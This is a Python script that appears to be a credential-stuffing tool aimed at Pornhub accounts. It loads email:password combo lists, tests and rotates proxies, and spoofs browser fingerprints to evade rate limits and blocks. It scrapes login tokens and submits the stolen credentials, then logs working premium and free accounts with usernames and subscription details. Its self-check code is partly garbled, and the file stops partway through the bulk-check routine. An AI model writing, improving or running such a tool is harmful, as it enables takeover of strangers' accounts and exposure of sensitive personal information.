#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import base64
import hashlib
import asyncio
import random
import string
import configparser
import subprocess
import shutil
import urllib3
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from curl_cffi import requests as cf
from curl_cffi.requests import AsyncSession

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "UE9STkhVQiBDT01CTyBDSEVDS0VS"
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "UE9STkhVQl9DSEVDS0VSX0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG  = "ZXllbGlmdGVyLXBvcmh1Yi12MS1zZWFs"


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = ["chrome131_android", "chrome131", "chrome124", "chrome120", "chrome110", "chrome"]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


CONFIG_PATH = "config_pornhub.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "5",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "3",
            "retry_delay": "1",
            "combo_delay": "0.5",
            "debug": "false",
            "rate_limit_backoff": "6",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
            "fetch_subscriptions": "true",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(100, c.getint("threads", 5)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 3)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.5)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 6)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 2)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["fetch_subscriptions"] = c.getboolean("fetch_subscriptions", True)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
FETCH_SUBS = CONFIG["fetch_subscriptions"]

LOGIN_URL = "https://www.pornhub.com/login"
AUTH_URL = "https://www.pornhub.com/front/authenticate"
SUBS_URL = "https://www.pornhub.com/subscriptions"
HOME_URL = "https://www.pornhub.com"

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

COMMON = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "origin": "https://www.pornhub.com",
    "referer": HOME_URL,
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": UA,
}

BAD_KEYS = [
    "incorrect password",
    "wrong password",
    "invalid password",
    "invalid username",
    "account not found",
    "user not found",
    "login failed",
]

_EYELIFTER_COMBO_RE = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*(.+?)(?:\s*\|\s*.*)?$"
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).lower().strip()
            pwd = m.group(2).strip()
            if email and pwd:
                out.add(f"{email}:{pwd}")
    return out


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = cf.Session(impersonate=random.choice(UA_POOL), timeout=12)
        s.proxies = {"http": p, "https": p}
        r = s.get(HOME_URL, headers={"user-agent": UA}, verify=False)
        return r.status_code == 200 and len(r.content) > 5000
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    Eyelifter_verify("load_proxies")
    out = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    fp = Eyelifter_format_proxy(line)
                    if fp:
                        out.append(fp)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=min(69, len(proxies))) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} BAD:{bad} | {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad]
        if not avail and _eyelifter_pool:
            _eyelifter_bad.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_is_bad_creds(msg):
    if not msg:
        return False
    low = msg.lower()
    return any(k in low for k in BAD_KEYS)


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def Eyelifter_dump(self, label, resp, max_lines=80):
        if not DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more)"))

    async def Eyelifter_get_token(self):
        try:
            r = await self.session.get(
                LOGIN_URL,
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "user-agent": UA,
                },
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return None, "timeout"
            if "proxy" in msg:
                return None, "proxy"
            return None, f"network:{type(e).__name__}"

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code != 200:
            return None, f"http_{r.status_code}"

        token_match = re.search(r'name="token"\s+value="([^"]+)"', r.text)
        if not token_match:
            return None, "token_missing"
        
        return token_match.group(1), None

    async def Eyelifter_login(self, email, password, token):
        try:
            r = await self.session.post(
                AUTH_URL,
                data={
                    "email": email,
                    "password": password,
                    "token": token,
                    "from": "pc_login_modal_:index",
                },
                headers={
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://www.pornhub.com",
                    "referer": LOGIN_URL,
                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "user-agent": UA,
                    "x-requested-with": "XMLHttpRequest",
                },
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return None, "timeout"
            if "proxy" in msg:
                return None, "proxy"
            return None, f"network:{type(e).__name__}"

        self.Eyelifter_dump("LOGIN", r, 40)

        if r.status_code == 429:
            return None, "rate_limit"
        if r.status_code in (403, 451):
            return None, "block"
        if r.status_code != 200:
            return None, f"http_{r.status_code}"

        try:
            j = r.json()
        except Exception:
            return None, "parse"

        return j, None

    async def Eyelifter_get_subscriptions(self):
        try:
            r = await self.session.get(
                SUBS_URL,
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "referer": HOME_URL,
                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "user-agent": UA,
                },
                proxies=self.Eyelifter_proxies(), verify=False,
            )
            self.Eyelifter_dump("SUBS", r, 60)
            if r.status_code == 200:
                return r.text
        except Exception:
            pass
        return None

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            token, err = await self.Eyelifter_get_token()
            if err:
                return {"status": "error", "error_type": err,
                        "message": f"token: {err}"}

            login_json, err = await self.Eyelifter_login(email, password, token)
            if err:
                return {"status": "error", "error_type": err,
                        "message": f"login: {err}"}

            if login_json.get("success") != "1":
                msg = login_json.get("message", "Auth failed")
                if Eyelifter_is_bad_creds(msg):
                    return {"status": "bad", "message": msg}
                return {"status": "error", "error_type": "auth",
                        "message": msg}

            username = login_json.get("username")
            is_premium = login_json.get("premium_redirect_cookie") == "1"

            subs_data = {"counts": {}, "has_subscriptions": False, "subscription_names": [], "total": 0}
            if FETCH_SUBS:
                html = await self.Eyelifter_get_subscriptions()
                if html:
                    logged_in = re.search(r'var\s+isLoggedIn\s*=\s*"(\d)"', html)
                    if logged_in and logged_in.group(1) == "1":
                        for type_name in ['models', 'channels', 'pornstars']:
                            match = re.search(rf'data-type="{type_name}"\s+data-count="(\d+)"', html)
                            if match:
                                subs_data["counts"][type_name] = int(match.group(1))
                        
                        if not subs_data["counts"]:
                            patterns = [
                                (r'Models\s*\((\d+)\)', 'models'),
                                (r'Channels\s*\((\d+)\)', 'channels'),
                                (r'Pornstars\s*\((\d+)\)', 'pornstars'),
                            ]
                            for pattern, key in patterns:
                                match = re.search(pattern, html, re.IGNORECASE)
                                if match:
                                    subs_data["counts"][key] = int(match.group(1))
                        
                        subs_data["has_subscriptions"] = not ("No subscriptions yet" in html or "no subscriptions" in html.lower())
                        subs_data["total"] = sum(subs_data["counts"].values())
                        
                        item_pattern = r'<a[^>]*href="/(model|channel|pornstar)/[^"]+"[^>]*>([^<]+)</a>'
                        items = re.findall(item_pattern, html)
                        for item_type, item_name in items[:10]:
                            subs_data["subscription_names"].append(f"{item_type}:{item_name.strip()}")

            user = {
                "email": email,
                "password": password,
                "username": username,
                "is_premium": is_premium,
                "subscriptions": subs_data,
            }

            if is_premium:
                return {"status": "hit", "user": user}
            return {"status": "free", "user": user}

        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()


def Eyelifter_fmt_line(combo, u, status):
    def s(v):
        if v is None or v == "" or v == "N/A":
            return None
        return str(v)

    tag = {"hit": "HIT", "free": "FREE"}.get(status, "?")
    
    subs = u.get("subscriptions", {}) or {}
    sub_count = subs.get("total", 0)
    
    fields = [
        ("Plan", "Premium" if u.get("is_premium") else "Free"),
        ("Username", s(u.get("username"))),
        ("Email", s(u.get("email"))),
    ]

    if status == "hit":
        fields.extend([
            ("SubsCount", str(sub_count)),
            ("Models", str(subs.get("counts", {}).get("models", 0))),
            ("Channels", str(subs.get("counts", {}).get("channels", 0))),
            ("Pornstars", str(subs.get("counts", {}).get("pornstars", 0))),
            ("HasSubs", "Yes" if subs.get("has_subscriptions") else "No"),
            ("Avatar", u.get("avatar", "-")[:50] + "..." if u.get("avatar") else None),
            ("Checked", datetime.now().strftime("%Y-%m-%d %H:%M")),
            ("Capture", "PREMIUM_ACTIVE"), 
        ])
    else:
        fields.extend([
            ("Subs", str(sub_count)),
            ("Status", "VALID_FREE"),
        ])
    
    parts = []
    for label, value in fields:
        if value is None or value == "-":
            continue
        parts.append(f"{label}={value}")

    return f"{tag} {combo} | " + " | ".join(parts) + f" | {AUTHOR_TAG}"
    
async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 3) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        else:
            if proxy and proxy in _eyelifter_bad:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(1)
            continue

        if et in ("proxy", "timeout"):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 1))
            continue

        if et.startswith("http_") or et.startswith("api_") or et.startswith("network:") or et in ("parse", "token_missing"):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            await asyncio.sleep(CONFIG.get("retry_delay", 1))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 1))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            print(f"\n[{done}/{total}] {Eyelifter_color('32', full, True)}\n")
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo} | invalid credentials\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "PREMIUM" if u.get("is_premium") else "FREE"
        subs = u.get("subscriptions", {}) or {}
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("Username", u.get("username", "-")),
            ("Is Premium", "Yes" if u.get("is_premium") else "No"),
            ("Subscriptions", subs.get("total", 0)),
            ("Models", subs.get("counts", {}).get("models", 0)),
            ("Channels", subs.get("counts", {}).get("channels", 0)),
            ("Pornstars", subs.get("counts", {}).get("pornstars", 0)),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    else:
        st = result.get("status", "unknown")
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        if st == "bad":
            Eyelifter_log("❌", "ERROR", "RESULT", "invalid credentials")
        else:
            Eyelifter_log("❌", "ERROR", "RESULT", f"{st} [{et}] – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f, _eyelifter_folder, _eyelifter_pool, _eyelifter_bad
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = sorted(Eyelifter_extract_combos(content))
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "ph_hits.txt"), "w", encoding="utf-8")
